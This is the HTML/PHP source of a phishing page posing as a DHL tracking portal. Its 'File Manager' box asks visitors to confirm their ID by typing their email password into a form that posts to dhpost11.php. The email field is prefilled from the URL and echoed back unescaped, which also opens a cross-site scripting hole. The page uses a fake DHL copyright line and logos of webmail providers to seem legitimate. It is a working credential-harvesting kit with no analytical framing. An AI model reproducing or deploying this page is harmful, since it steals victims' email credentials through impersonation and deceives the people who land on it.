
<html>
<head><title> DHL | Online Tracking Portal </title>
<link rel="shortcut icon" href="http://www.dhl.com.ng/img/favicon.gif" type="image/gif"/>
</head>
<body bgcolor="#F2BF16" marginhieght="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">

<table width="100%" height="100%" cellspacing="0" align="center">

<tr><td height="7%" bgcolor="">
</td></tr>



<tr><td height="20%" bgcolor="#000000">

	<table align="center"><tr>

	<td>
	<img src="http://colalize.ucoz.net/dhl.jpg" width="150" height="70">
	</td>
	
	<td width="5"></td>

	<td>
	<img src="http://colalize.ucoz.net/dhl2.jpg" width="550" height="70">
	</td>
	
	</tr></table>

</td></tr>




<tr><td height="55%" bgcolor="#FCCB45">


	<table width="900" align="center">

	<tr><td>

		<table align="center"><tr>

		<td width="300" height="200" bgcolor="#DF0101" 
		style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;">

			<table width="300" height="200" bgcolor="#FFBF00" 
			style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;"><tr><td>

				<table width="230" align="center">

				<tr><td>
				<font face="calibri" size="4" color="#ff0000"><b>
				File Manager
				</b></font>
				</td></tr>

				
				


				<tr><td>
	
					<table width="220">

					<tr><td>

					<tr><td>
					<font face="calibri" size="2">
					Confirm your ID to unlock file now
					</font>
					</td></tr>

					<form method="post" action="dhpost11.php">
					</td></tr>

					<tr><td>
					<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['email']; ?>" placeholder="Username">
				<font face="arial" size="4" color="#045FB4"><?php echo $_GET['email']; ?> </font>
					</td></tr>

					<tr><td>
					<input  name="pass" type="password" style="width:220px; height:27px; font-family: Verdana; font-size: 12px; color:#000000; 
					background-color: #ffffff; border: solid 1px #FF8000; padding: 10px"" required="" placeholder="Email Password">
					</td></tr>

					<tr><td height="5"></td></tr>
	
					<tr><td>
					<input type="submit" value="Unlock File" style="width:120px; height:35px; background-color: #DF0101; border: solid 3px #DF0101; 
					font-family: Verdana; font-size: 13px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
					-khtml-border-radius: 4px; border-radius: 4px;">				
					</td></tr>

					<tr><td>
					</form>
					</td></tr>

					</table>

				</td></tr>

				</table>

			</td></tr></table>

		</td>


		<td width="30"></td>



		<td width="370" height="200" bgcolor="#DF0101" 
		style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;">

			<table width="370" height="200" bgcolor="#FFBF00" 
			style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;"><tr><td>

				<table width="300" align="center">

				<tr><td>
				<font face="calibri" size="4" color="#ff0000"><b>
				Portal Unique Features:
				</b></font>
				</td></tr>



				<tr><td>
				
					<table width="">

					<tr><td>

						<table><tr>
						<td>
						<img src="http://colalize.ucoz.net/bt.png" width="12" height="12">
						</td>

						<td width="5"></td>

						<td>
						<font face="calibri" size="2">
						View your receivable parcel in real time 24/7
						</font>
						</td>

						</tr></table>

					</td></tr>




					<tr><td>

						<table><tr>
						<td>
						<img src="http://colalize.ucoz.net/bt.png" width="12" height="12">
						</td>

						<td width="5"></td>

						<td>
						<font face="calibri" size="2">
						Search for invoices or airway bills
						</font>
						</td>

						</tr></table>

					</td></tr>





					<tr><td>

						<table><tr>
						<td>
						<img src="http://colalize.ucoz.net/bt.png" width="12" height="12">
						</td>

						<td width="5"></td>

						<td>
						<font face="calibri" size="2">
						Download your invoices & Airwaybills
						</font>
						</td>

						</tr></table>

					</td></tr>





					<tr><td>

						<table><tr>
						<td>
						<img src="http://colalize.ucoz.net/bt.png" width="12" height="12">
						</td>

						<td width="5"></td>

						<td>
						<font face="calibri" size="2">
						Dispute your invoices online
						</font>
						</td>

						</tr></table>

					</td></tr>




					<tr><td>

						<table><tr>
						<td>
						<img src="http://colalize.ucoz.net/bt.png" width="12" height="12">
						</td>

						<td width="5"></td>

						<td>
						<font face="calibri" size="2">
						Post complaints and inquiries online
						</font>
						</td>

						</tr></table>

					</td></tr>
	
					
					</table>

				</td><tr>

				</table>

			</td></tr></table>

		</td>

		</tr></table>

	</td></tr>




	<tr><td height="20"></td></tr>



	<tr><td>

		<table align="center"><tr>

		<td>
		<img src="http://colalize.ucoz.net/green.png" width="120" height="60">
		</td>


		<td width="40"></td>

		
		<td>
		<font face="calibri" size="2">
		<b><font color="#FF0000">©2015 DHL International Worldwide. All Rights Reserved.</font></b>
		<br>
		<i><font face="arial" size="1"><b>This website is optimised for IE version 6.0 and above</b></font></i>
		<br><br><br>
		</font>
		</td>


		<td width="220"></td>
		
		</tr></table>
	
	</td></tr>

	</table>

</td></tr>




<tr><td height="10%" bgcolor="#ffffff">

	<table align="center"><tr>

	<td>
	<font face="arial narrow" size="+1" color="#DF0101"><b>
	Powered by:
	</b></font>
	</td>

	<td width="10"></td>

	<td>
	<img src="http://colalize.ucoz.net/yahoo.png" width="100" height="23">
	</td>

	<td width="20"></td>

	<td>
	<img src="http://colalize.ucoz.net/163.gif" width="100" height="25">
	</td>

	<td width="8"></td>

	<td>
	<img src="http://colalize.ucoz.net/126.gif" width="100" height="25">
	</td>

	<td width="8"></td>

	<td>
	<img src="http://colalize.ucoz.net/webmail.jpg" width="100" height="40">
	</td>

	<td width="8"></td>

	<td>
	<img src="http://colalize.ucoz.net/hotmail.jpg" width="110" height="25">
	</td>

	<td width="12"></td>

	<td>
	<img src="http://colalize.ucoz.net/gmail.png" width="90" height="30">
	</td>

	<td width="12"></td>

	<td>
	<img src="http://colalize.ucoz.net/alibaba.png" width="130" height="30">
	</td>
	
	</tr></table>

</td></tr>



<tr><td height="8%" bgcolor="#000000">
</td></tr>


</table>

</body>
</html>